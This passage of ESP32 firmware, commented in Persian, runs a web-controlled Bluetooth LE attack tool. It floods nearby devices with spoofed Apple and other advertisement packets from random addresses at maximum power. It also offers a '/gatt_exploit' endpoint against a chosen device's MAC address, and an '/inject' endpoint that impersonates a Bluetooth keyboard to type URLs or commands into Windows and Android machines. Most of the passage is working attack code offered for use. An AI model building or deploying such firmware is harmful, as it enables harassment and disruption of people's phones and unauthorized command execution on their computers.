شد!';st.style.color='#22c55e';}).catch(()=>{st.innerText='خطا در ارسال پیلود به برد';st.style.color='#ef4444';});}</script></body></html>")rawliteral";

// ====================== ابزارهای امن دیکد URL ======================
int hex2int(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return 0;
}

String urlDecode(String str) {
  String encodedString = "";
  char c, code0, code1;
  for (int i = 0; i < str.length(); i++) {
    c = str.charAt(i);
    if (c == '+') {
      encodedString += ' ';
    } else if (c == '%') {
      if (i + 2 < str.length()) {
        code0 = str.charAt(i+1);
        code1 = str.charAt(i+2);
        char decoded = (hex2int(code0) << 4) | hex2int(code1);
        encodedString += decoded;
        i += 2;
      }
    } else {
      encodedString += c;
    }
  }
  return encodedString;
}

// ====================== ارسال HTTP ======================
void sendHTTPStr(WiFiClient& client, const char* contentType, const String& body) {
  size_t len = body.length();
  client.print(F("HTTP/1.1 200 OK\r\n"));
  client.print(F("Content-Type: ")); client.print(contentType); client.print(F("\r\n"));
  client.print(F("Content-Length: ")); client.print(len); client.print(F("\r\n"));
  client.print(F("Connection: close\r\n\r\n"));
  const size_t chunkSize = 512;
  const char* p = body.c_str();
  size_t sent = 0;
  while (sent < len) {
    size_t toSend = (len - sent < chunkSize) ? (len - sent) : chunkSize;
    client.write((const uint8_t*)(p + sent), toSend);
    sent += toSend;
    delay(1);
  }
  client.flush(); client.stop();
}

void sendHTTPFlash(WiFiClient& client, const char* contentType, const char* body, size_t len) {
  client.print(F("HTTP/1.1 200 OK\r\n"));
  client.print(F("Content-Type: ")); client.print(contentType); client.print(F("\r\n"));
  client.print(F("Content-Length: ")); client.print(len); client.print(F("\r\n"));
  client.print(F("Connection: close\r\n\r\n"));
  const size_t chunkSize = 512;
  for (size_t i = 0; i < len; i += chunkSize) {
    size_t toSend = (len - i < chunkSize) ? (len - i) : chunkSize;
    uint8_t buf[512];
    for (size_t j = 0; j < toSend; j++) buf[j] = pgm_read_byte_near((const uint8_t*)body + i + j);
    client.write(buf, toSend);
    delay(1);
  }
  client.flush(); client.stop();
}

String buildReconJSON() {
  String json = "[";
  for (int i = 0; i < reconCount; i++) {
    json += "{\"name\":\"" + jsonEscape(reconList[i].name) + "\",";
    json += "\"mac\":\"" + reconList[i].mac + "\",";
    json += "\"rssi\":" + String(reconList[i].rssi) + ",";
    json += "\"distance\":" + String(reconList[i].distance, 1) + ",";
    json += "\"proto\":\"" + reconList[i].protoType + "\",";
    json += "\"category\":\"" + jsonEscape(reconList[i].deviceCategory) + "\",";
    json += "\"icon\":\"" + reconList[i].iconClass + "\",";
    json += "\"vendor\":\"" + jsonEscape(reconList[i].vendor) + "\",";
    json += "\"threat\":\"" + reconList[i].threatLevel + "\",";
    json += "\"bleVersion\":\"" + reconList[i].bleVersion + "\",";
    json += "\"cve\":\"" + jsonEscape(reconList[i].cveMatch) + "\"}";
    if (i < reconCount - 1) json += ",";
  }
  json += "]";
  return json;
}

// ====================== اسکن BLE ======================
void doBLEScanSync(int durationSec) {
  if (pBLEScan == nullptr) return;
  pBLEScan->clearResults();
  pBLEScan->setAdvertisedDeviceCallbacks(new ScanCallbacks(), false);
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(50);
  pBLEScan->start(durationSec, false);
  pBLEScan->clearResults();
}

void handleWebClients() {
  WiFiClient client = server.available();
  if (!client) return;

  unsigned long timeout = millis() + 200;
  String request = "";
  while (client.connected() && millis() < timeout) {
    if (client.available()) {
      request = client.readStringUntil('\n');
      break;
    }
  }
  if (request.length() == 0) { client.stop(); return; }

  if (request.indexOf("GET /toggle") != -1) {
    attackRunning = !attackRunning;
    if (attackRunning) {
      if (bleKeyboard != nullptr) {
        delete bleKeyboard;
        bleKeyboard = nullptr;
      }
      hidModeActive = false;
      
      BLEServer *pServer = BLEDevice::createServer();
      if (pServer != nullptr) {
        pAdvertising = pServer->getAdvertising();
      }
      if (pAdvertising != nullptr) {
        pAdvertising->stop();
      }

      totalPackets = 0;
      attackStartTime = millis();
    } else {
      if (pAdvertising != nullptr) pAdvertising->stop();
    }
    sendHTTPStr(client, "text/plain", attackRunning ? F("RUNNING") : F("STOPPED"));
  }
  else if (request.indexOf("GET /mode?val=0") != -1) { currentMode=0; sendHTTPStr(client, "text/plain", F("OK")); }
  else if (request.indexOf("GET /mode?val=1") != -1) { currentMode=1; sendHTTPStr(client, "text/plain", F("OK")); }
  else if (request.indexOf("GET /mode?val=2") != -1) { currentMode=2; sendHTTPStr(client, "text/plain", F("OK")); }
  else if (request.indexOf("GET /speed?val=0") != -1) { speedSetting=0; spamInterval=300; sendHTTPStr(client, "text/plain", F("OK")); }
  else if (request.indexOf("GET /speed?val=1") != -1) { speedSetting=1; spamInterval=100; sendHTTPStr(client, "text/plain", F("OK")); }
  else if (request.indexOf("GET /speed?val=2") != -1) { speedSetting=2; spamInterval=50; sendHTTPStr(client, "text/plain", F("OK")); }
  
  else if (request.indexOf("GET /startHid?name=") != -1) {
    int idx = request.indexOf("name=");
    int endIdx = request.indexOf(" ", idx);
    String hidNameRaw = request.substring(idx + 5, endIdx);
    String hidName = urlDecode(hidNameRaw);
    initHidServer(hidName);
    sendHTTPStr(client, "text/plain", F("HID_STARTED"));
  }
  
  else if (request.indexOf("GET /hid_status") != -1) {
    bool active = hidModeActive;
    bool conn = (bleKeyboard != nullptr && bleKeyboard->isConnected());
    String body = "{\"active\":" + String(active ? "true" : "false") + ",\"connected\":" + String(conn ? "true" : "false") + "}";
    sendHTTPStr(client, "application/json", body);
  }
  
  else if (request.indexOf("GET /gatt_scan") != -1) {
    if (pBLEScan != nullptr) {
      pBLEScan->clearResults();
      pBLEScan->setActiveScan(true);
      BLEScanResults* foundDevices = pBLEScan->start(2, false);
      String json = "[";
      int count = foundDevices->getCount();
      int added = 0;
      for (int i = 0; i < count; i++) {
        BLEAdvertisedDevice device = foundDevices->getDevice(i);
        if (device.isConnectable()) {
          String devName = device.haveName() ? device.getName().c_str() : "Unknown BLE";
          String devMac = device.getAddress().toString().c_str();
          int devRssi = device.getRSSI();
          if (added > 0) json += ",";
          json += "{\"name\":\"" + jsonEscape(devName) + "\",\"mac\":\"" + devMac + "\",\"rssi\":" + String(devRssi) + "}";
          added++;
        }
      }
      json += "]";
      pBLEScan->clearResults();
      sendHTTPStr(client, "application/json", json);
    } else {
      sendHTTPStr(client, "application/json", F("[]"));
    }
  }

  else if (request.indexOf("GET /gatt_exploit?") != -1) {
    int macIdx = request.indexOf("mac=");
    String targetMac = "";
    if (macIdx != -1) {
      int endMac = request.indexOf(" HTTP", macIdx);
      if (endMac == -1) endMac = request.indexOf(" ", macIdx);
      targetMac = urlDecode(request.substring(macIdx + 4, endMac));
    }
    if (targetMac.length() > 0) {
      String gattResult = readGattExploit(targetMac);
      sendHTTPStr(client, "application/json", gattResult);
    } else {
      sendHTTPStr(client, "application/json", F("{\"error\":\"MAC address not provided\"}"));
    }
  }
  
  else if (request.indexOf("GET /inject?") != -1) {
    int typeIdx = request.indexOf("type=");
    int payloadIdx = request.indexOf("payload=");
    
    String pType = "win_url";
    String payloadStr = "https://google.com";

    if (typeIdx != -1) {
      int endType = request.indexOf("&", typeIdx);
      if (endType == -1) endType = request.indexOf(" HTTP", typeIdx);
      pType = request.substring(typeIdx + 5, endType);
    }
    
    if (payloadIdx != -1) {
      int endPayload = request.indexOf(" HTTP", payloadIdx);
      if (endPayload != -1) {
         String rawPayload = request.substring(payloadIdx + 8, endPayload);
         payloadStr = urlDecode(rawPayload); 
      }
    }
    
    if (pType == "android_url") {
      injectAndroidPayload(payloadStr);
    } else if (pType == "win_url") {
      injectWindowsPayload(payloadStr, false);
    } else if (pType == "win_cmd") {
      injectWindowsPayload(payloadStr, true);
    }
    
    sendHTTPStr(client, "text/plain", F("INJECTED"));
  }
  
  else if (request.indexOf("GET /stats") != -1) {
    String speedName = speedSetting==0?"Normal":speedSetting==1?"Fast":"Turbo";
    unsigned long uptime = attackRunning ? (millis() - attackStartTime) / 1000 : 0;
    int pps = (attackRunning && uptime > 0) ? (int)(totalPackets / uptime) : 0;
    String body = "{\"packets\":" + String(totalPackets) + ",\"pps\":" + String(pps) + ",\"uptime\":" + String(uptime) + ",\"speed\":\"" + speedName + "\"}";
    sendHTTPStr(client, "application/json", body);
  }
  else if (request.indexOf("GET /quickscan") != -1 || request.indexOf("GET /scan") != -1) {
    reconCount = 0;
    doBLEScanSync(2);
    sortReconByRSSI();
    sendHTTPStr(client, "application/json", buildReconJSON());
  }
  else if (request.indexOf("GET /clear") != -1) {
    reconCount = 0;
    sendHTTPStr(client, "text/plain", F("OK"));
  }
  else {
    size_t htmlLen = strlen_P(PAGE_HTML);
    sendHTTPFlash(client, "text/html", PAGE_HTML, htmlLen);
  }
  yield();
}

void executeNextPacket() {
  if (pAdvertising == nullptr) return;
  pAdvertising->stop();
  esp_bd_addr_t dummy_addr = {0};
  for (int i = 0; i < 6; i++) dummy_addr[i] = random(0, 256);
  dummy_addr[0] |= 0xC0;
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  uint8_t packet[31];
  size_t packetLen = 0;
  bool sendApple = false;
  if (currentMode == 0) sendApple = true;
  else if (currentMode == 1) sendApple = false;
  else { sendApple = mixToggleFlag; mixToggleFlag = !mixToggleFlag; }
  if (sendApple) {
    int totalApple = sizeof(ALL_DEVICES)/sizeof(ALL_DEVICES[0]);
    int idx;
    do { idx = random(0, totalApple); } while (totalApple > 1 && idx == lastAppleIdx);
    lastAppleIdx = idx;
    generateApplePacket(ALL_DEVICES[idx], packet, packetLen);
  } else {
    generateOtherPacket(packet, packetLen);
  }
  oAdvertisementData.addData((char*)packet, packetLen);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->start();
  totalPackets++;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.setSleep(false);
  WiFi.softAP(ap_ssid, ap_pass, 1, false, 4);
  server.begin();
  delay(100);

  BLEDevice::init("");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  if (pServer != nullptr) pAdvertising = pServer->getAdvertising();
  pBLEScan = BLEDevice::getScan();
  if (pBLEScan != nullptr) {
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(50);
  }
  randomSeed(esp_random());
}

void loop() {
  handleWebClients();
  if (attackRunning) {
    unsigned long currentMillis = millis();
    if (currentMillis - previousMillis >= (unsigned long)spamInterval) {
      previousMillis = currentMillis;
      executeNextPacket();
    }
  }
  yield();
}